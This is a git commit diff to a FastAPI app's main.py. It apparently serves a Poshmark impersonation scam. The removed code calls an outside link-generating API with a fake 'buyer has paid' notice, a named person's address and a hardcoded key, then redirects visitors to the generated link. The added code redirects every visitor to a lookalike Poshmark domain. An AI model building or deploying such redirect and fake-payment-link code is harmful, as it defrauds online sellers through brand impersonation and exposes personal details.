cb58b07ec84d3677bddb3a6ca0a5ed0af227a98e
glenn1955joseph1955 <glenn1955.joseph.1955@gmail.com>
2025-02-02 15:06:16 +0300

    Update main.py

--- main.py
+++ main.py
@@ -10,22 +10,5 @@ app = FastAPI()
 
 @app.get("/")
 def new():
-    url = 'https://rakuzanapi.com/api/createLink'
-
-    headers = {
-        'key': 'akwd7749221011picbs33m1l',
-        'title': 'The buyer has paid for and arranged shipping on your product',
-        'price': ' ',
-        'name': 'Jeff J. Mathis',
-        'address': '1586 Ritter Street Huntsville, AL 35816',
-        'photo': 'https://s3-symbol-logo.tradingview.com/poshmark--600.png',
-        'balance': '1',
-        "linkService": "poshmark_us"
-    }
-
-    response = requests.post(url, data=headers).json()
-    print(response)
-    url = response['link']
-    id_ = response['id']
-    return RedirectResponse(url)
+    return RedirectResponse('https://poshmark21.com')
 
